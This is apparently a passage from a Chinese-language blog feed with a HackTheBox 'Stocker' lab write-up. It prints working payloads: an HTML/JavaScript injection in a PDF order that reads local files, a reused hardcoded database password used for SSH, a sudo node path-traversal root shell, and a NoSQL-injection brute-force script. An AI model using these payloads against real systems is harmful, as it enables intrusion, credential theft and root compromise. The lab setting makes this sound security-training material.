class="line">proxy:x:13:13:proxy:&#x2F;bin:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">www-data:x:33:33:www-data:&#x2F;var&#x2F;www:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">backup:x:34:34:backup:&#x2F;var&#x2F;backups:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:&#x2F;var&#x2F;list:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">irc:x:39:39:ircd:&#x2F;var&#x2F;run&#x2F;ircd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):&#x2F;var&#x2F;lib&#x2F;gnats:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">nobody:x:65534:65534:nobody:&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-timesync:x:102:104:systemd Time Synchronization,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">messagebus:x:103:106::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">syslog:x:104:110::&#x2F;home&#x2F;syslog:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">_apt:x:105:65534::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tss:x:106:112:TPM software stack,,,:&#x2F;var&#x2F;lib&#x2F;tpm:&#x2F;bin&#x2F;false</span><br><span class="line">uuidd:x:107:113::&#x2F;run&#x2F;uuidd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">tcpdump:x:108:114::&#x2F;nonexistent:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">landscape:x:109:116::&#x2F;var&#x2F;lib&#x2F;landscape:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">pollinate:x:110:1::&#x2F;var&#x2F;cache&#x2F;pollinate:&#x2F;bin&#x2F;false</span><br><span class="line">sshd:x:111:65534::&#x2F;run&#x2F;sshd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">systemd-coredump:x:999:999:systemd Core Dumper:&#x2F;:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">fwupd-refresh:x:112:119:fwupd-refresh user,,,:&#x2F;run&#x2F;systemd:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">mongodb:x:113:65534::&#x2F;home&#x2F;mongodb:&#x2F;usr&#x2F;sbin&#x2F;nologin</span><br><span class="line">angoose:x:1001:1001:,,,:&#x2F;home&#x2F;angoose:&#x2F;bin&#x2F;bash</span><br><span class="line">_laurel:x:998:998::&#x2F;var&#x2F;log&#x2F;laurel:&#x2F;bin&#x2F;false</span><br></pre></td></tr></table></figure><p>读取文件<code>/etc/nginx/nginx.conf</code></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="attr">&quot;basket&quot;</span>:[&#123;</span><br><span class="line"><span class="attr">&quot;_id&quot;</span>:<span class="string">&quot;638f116eeb060210cbd83a8d&quot;</span>,</span><br><span class="line"><span class="attr">&quot;title&quot;</span>:<span class="string">&quot;&lt;iframe id=&#x27;myFrame&#x27; style=&#x27;width: 1000px; height: 1000px;&#x27; src=&#x27;file:///etc/nginx/nginx.conf&#x27;&gt;&lt;/iframe&gt;&lt;script&gt;var frame = document.getElementById(&#x27;myFrame&#x27;);frame.onload = function () &#123;var body = frame.contentWindow.document.querySelector(&#x27;body&#x27;);body.style.fontSize = &#x27;0.3rem&#x27;;&#125;;&lt;/script&gt;&quot;</span>,</span><br><span class="line"><span class="attr">&quot;description&quot;</span>:<span class="string">&quot;It&#x27;s a red cup.&quot;</span>,</span><br><span class="line"><span class="attr">&quot;image&quot;</span>:<span class="string">&quot;red-cup.jpg../../../../../../etc/passwd&quot;</span>,</span><br><span class="line"><span class="attr">&quot;price&quot;</span>:<span class="number">-1</span>,</span><br><span class="line"><span class="attr">&quot;currentStock&quot;</span>:<span class="number">4</span>,</span><br><span class="line"><span class="attr">&quot;__v&quot;</span>:<span class="number">0</span>,</span><br><span class="line"><span class="attr">&quot;amount&quot;</span>:<span class="number">1</span></span><br><span class="line">&#125;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>文件<code>/etc/nginx/nginx.conf</code>内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line">user www-data;</span><br><span class="line">worker_processes auto;</span><br><span class="line">pid &#x2F;run&#x2F;nginx.pid;</span><br><span class="line">include &#x2F;etc&#x2F;nginx&#x2F;modules-enabled&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">events &#123;</span><br><span class="line">        worker_connections 768;</span><br><span class="line">        # multi_accept on;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http &#123;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Basic Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        sendfile on;</span><br><span class="line">        tcp_nopush on;</span><br><span class="line">        tcp_nodelay on;</span><br><span class="line">        keepalive_timeout 65;</span><br><span class="line">        types_hash_max_size 2048;</span><br><span class="line">        # server_tokens off;</span><br><span class="line"></span><br><span class="line">        # server_names_hash_bucket_size 64;</span><br><span class="line">        # server_name_in_redirect off;</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;mime.types;</span><br><span class="line">        default_type application&#x2F;octet-stream;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # SSL Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        ssl_protocols TLSv1 TLSv1.1 TLSv1.2 TLSv1.3; # Dropping SSLv3, ref: POODLE</span><br><span class="line">        ssl_prefer_server_ciphers on;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Logging Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        access_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log;</span><br><span class="line">        error_log &#x2F;var&#x2F;log&#x2F;nginx&#x2F;error.log;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Gzip Settings</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        gzip on;</span><br><span class="line"></span><br><span class="line">        # gzip_vary on;</span><br><span class="line">        # gzip_proxied any;</span><br><span class="line">        # gzip_comp_level 6;</span><br><span class="line">        # gzip_buffers 16 8k;</span><br><span class="line">        # gzip_http_version 1.1;</span><br><span class="line">        # gzip_types text&#x2F;plain text&#x2F;css application&#x2F;json application&#x2F;javascript text&#x2F;xml application&#x2F;xml application&#x2F;xml+rss text&#x2F;javascript;</span><br><span class="line"></span><br><span class="line">        ##</span><br><span class="line">        # Virtual Host Configs</span><br><span class="line">        ##</span><br><span class="line"></span><br><span class="line">        include &#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;*.conf;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;dev;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name dev.stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                proxy_pass http:&#x2F;&#x2F;127.0.0.1:3000;</span><br><span class="line">                proxy_http_version  1.1;</span><br><span class="line">                proxy_cache_bypass  $http_upgrade;</span><br><span class="line"></span><br><span class="line">                proxy_set_header Upgrade           $http_upgrade;</span><br><span class="line">                proxy_set_header Connection        &quot;upgrade&quot;;</span><br><span class="line">                proxy_set_header Host              $host;</span><br><span class="line">                proxy_set_header X-Real-IP         $remote_addr;</span><br><span class="line">                proxy_set_header X-Forwarded-For   $proxy_add_x_forwarded_for;</span><br><span class="line">                proxy_set_header X-Forwarded-Proto $scheme;</span><br><span class="line">                proxy_set_header X-Forwarded-Host  $host;</span><br><span class="line">                proxy_set_header X-Forwarded-Port  $server_port;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80;</span><br><span class="line"></span><br><span class="line">            root &#x2F;var&#x2F;www&#x2F;html;</span><br><span class="line">            index index.html index.htm index.nginx-debian.html;</span><br><span class="line"></span><br><span class="line">            server_name stocker.htb;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                    try_files $uri $uri&#x2F; &#x3D;404;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        server &#123;</span><br><span class="line">            listen 80 default;</span><br><span class="line"></span><br><span class="line">            server_name _;</span><br><span class="line"></span><br><span class="line">            location &#x2F; &#123;</span><br><span class="line">                return 301 http:&#x2F;&#x2F;stocker.htb;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>得知虚拟主机<code>dev.stocker.htb</code>文件根目录为<code>/var/www/dev</code></p><p>尝试访问<code>/var/www/dev/index.js</code>, <code>/var/www/dev/app.js</code>, <code>/var/www/dev/main.js</code></p><p>服务主文件路径为<code>/var/www/dev/index.js</code><br />内容如下</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&quot;express&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&quot;mongoose&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> session = <span class="built_in">require</span>(<span class="string">&quot;express-session&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> MongoStore = <span class="built_in">require</span>(<span class="string">&quot;connect-mongo&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&quot;path&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&quot;fs&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; generatePDF, formatHTML &#125; = <span class="built_in">require</span>(<span class="string">&quot;./pdf.js&quot;</span>);</span><br><span class="line"><span class="keyword">const</span> &#123; randomBytes, createHash &#125; = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">TODO:</span> Configure loading from dotenv for production</span></span><br><span class="line"><span class="keyword">const</span> dbURI = <span class="string">&quot;mongodb://dev:IHeardPassphrasesArePrettySecure@localhost/dev?authSource=admin&amp;w=1&quot;</span>;</span><br><span class="line"></span><br><span class="line">app.use(express.json());</span><br><span class="line">app.use(express.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(</span><br><span class="line">  session(&#123;</span><br><span class="line">    secret: randomBytes(<span class="number">32</span>).toString(<span class="string">&quot;hex&quot;</span>),</span><br><span class="line">    resave: <span class="literal">false</span>,</span><br><span class="line">    saveUninitialized: <span class="literal">true</span>,</span><br><span class="line">    store: MongoStore.create(&#123;</span><br><span class="line">      mongoUrl: dbURI,</span><br><span class="line">    &#125;),</span><br><span class="line">  &#125;)</span><br><span class="line">);</span><br><span class="line">app.use(<span class="string">&quot;/static&quot;</span>, express.static(__dirname + <span class="string">&quot;/assets&quot;</span>));</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/products&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json([]);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> products = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Product&quot;</span>).find();</span><br><span class="line">  <span class="keyword">return</span> res.json(products);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/login&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/login.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/login&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> &#123; username, password &#125; = req.body;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!username || !password) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// <span class="doctag">TODO:</span> Implement hashing</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> user = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;User&quot;</span>).findOne(&#123; username, password &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=login-error&quot;</span>);</span><br><span class="line"></span><br><span class="line">  req.session.user = user.id;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">console</span>.log(req.session);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/stock&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">&quot;/api/order&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.json(&#123;&#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!req.body.basket) <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">false</span> &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">new</span> mongoose.model(<span class="string">&quot;Order&quot;</span>)(&#123;</span><br><span class="line">    items: req.body.basket.map(<span class="function">(<span class="params">item</span>) =&gt;</span> (&#123; <span class="attr">title</span>: item.title, <span class="attr">price</span>: item.price, <span class="attr">amount</span>: item.amount &#125;)),</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="keyword">await</span> order.save();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.json(&#123; <span class="attr">success</span>: <span class="literal">true</span>, <span class="attr">orderId</span>: order._id &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/api/po/:id&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  <span class="keyword">const</span> order = <span class="keyword">await</span> mongoose.model(<span class="string">&quot;Order&quot;</span>).findById(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (!order) <span class="keyword">return</span> res.sendStatus(<span class="number">404</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">const</span> htmlPath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.html`</span>;</span><br><span class="line">  <span class="keyword">const</span> filePath = <span class="string">`<span class="subst">$&#123;__dirname&#125;</span>/pos/<span class="subst">$&#123;req.params.id&#125;</span>.pdf`</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  fs.writeFileSync(htmlPath, formatHTML(order));</span><br><span class="line"></span><br><span class="line">  <span class="keyword">await</span> generatePDF(req.params.id);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (fs.existsSync(filePath)) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendFile(filePath);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> res.sendStatus(<span class="number">500</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/stock&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (!req.session.user) <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login?error=auth-required&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> res.sendFile(__dirname + <span class="string">&quot;/templates/index.html&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.get(<span class="string">&quot;/logout&quot;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">  req.session.user = <span class="string">&quot;&quot;</span>;</span><br><span class="line">  <span class="keyword">return</span> res.redirect(<span class="string">&quot;/login&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.listen(port, <span class="string">&quot;127.0.0.1&quot;</span>, <span class="keyword">async</span> () =&gt; &#123;</span><br><span class="line">  <span class="keyword">await</span> mongoose.connect(dbURI);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Setup Mongoose schema</span></span><br><span class="line">  <span class="built_in">require</span>(<span class="string">&quot;./schema.js&quot;</span>);</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">`Example app listening on port <span class="subst">$&#123;port&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>得到登入密码<code>IHeardPassphrasesArePrettySecure</code></p><p>尝试用于登入angoose账户</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh angoose@10.10.11.196</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure><p>登入成功<br />查看user.txt</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /home/angoose/user.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c86f19c14d8ee6120dd3c01461b82764</span><br></pre></td></tr></table></figure><h2 id="权限提升"><a class="markdownIt-Anchor" href="#权限提升"></a> 权限提升</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo -l</span><br><span class="line">IHeardPassphrasesArePrettySecure</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Matching Defaults entries for angoose on stocker:</span><br><span class="line">    env_reset, mail_badpass, secure_path&#x3D;&#x2F;usr&#x2F;local&#x2F;sbin\:&#x2F;usr&#x2F;local&#x2F;bin\:&#x2F;usr&#x2F;sbin\:&#x2F;usr&#x2F;bin\:&#x2F;sbin\:&#x2F;bin\:&#x2F;snap&#x2F;bin</span><br><span class="line"></span><br><span class="line">User angoose may run the following commands on stocker:</span><br><span class="line">    (ALL) &#x2F;usr&#x2F;bin&#x2F;node &#x2F;usr&#x2F;local&#x2F;scripts&#x2F;*.js</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> <span class="string">&#x27;require(&quot;child_process&quot;).spawn(&quot;/bin/bash&quot;, [&quot;-p&quot;], &#123;stdio: [0, 1, 2]&#125;)&#x27;</span> &gt; /tmp/BFL.js</span><br><span class="line">sudo /usr/bin/node /usr/<span class="built_in">local</span>/scripts/../../../tmp/BFL.js</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat &#x2F;root&#x2F;root.txt</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afd487cd1a8b2f2b99d610424c24f39c</span><br></pre></td></tr></table></figure><hr /><blockquote><p>错误思路</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb&#x2F;login --json &#39;&#123;&quot;username&quot;: &#123;&quot;$ne&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#39; -v</span><br><span class="line">...</span><br><span class="line">Location: &#x2F;login?error&#x3D;login-error</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl dev.stocker.htb&#x2F;login --json &#39;&#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$ne&quot;: null&#125; &#125;&#39; -v</span><br><span class="line">...</span><br><span class="line">Location: &#x2F;stock</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import string</span><br><span class="line"></span><br><span class="line">req &#x3D; requests.session()</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;dev.stocker.htb&#x2F;login&quot;</span><br><span class="line">password &#x3D; &quot;&quot;</span><br><span class="line">dic &#x3D; string.printable</span><br><span class="line">while 1:</span><br><span class="line">exit &#x3D; 1</span><br><span class="line">for _ in dic:</span><br><span class="line">json &#x3D; &#123;&quot;username&quot;: &#123;&quot;$eq&quot;: &quot;angoose&quot;&#125;, &quot;password&quot;: &#123;&quot;$regex&quot;: &quot;^%s&quot; % (password + _)&#125; &#125;</span><br><span class="line">print(json)</span><br><span class="line">res &#x3D; req.post(url, json &#x3D; json, allow_redirects &#x3D; False)</span><br><span class="line">if res.headers[&quot;Location&quot;] &#x3D;&#x3D; &quot;&#x2F;stock&quot;:</span><br><span class="line">password &#x3D; password + _</span><br><span class="line">print(password)</span><br><span class="line">exit &#x3D; 0</span><br><span class="line">break</span><br><span class="line">if exit &#x3D;&#x3D; 1:</span><br><span class="line">exit()</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b3e795719e2a644f69838a593dd159ac</span><br></pre></td></tr></table></figure><p>rockyou.txt没跑出来</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;日常记录&lt;/p&gt;</summary>
    
    
    
    <category term="WriteUp" scheme="https://yoloyolo.top/categories/WriteUp/"/>
    
    
    <category term="Pentest" scheme="https://yoloyolo.top/tags/Pentest/"/>
    
    <category term="HackTheBox" scheme="https://yoloyolo.top/tags/HackTheBox/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox_Soccer</title>
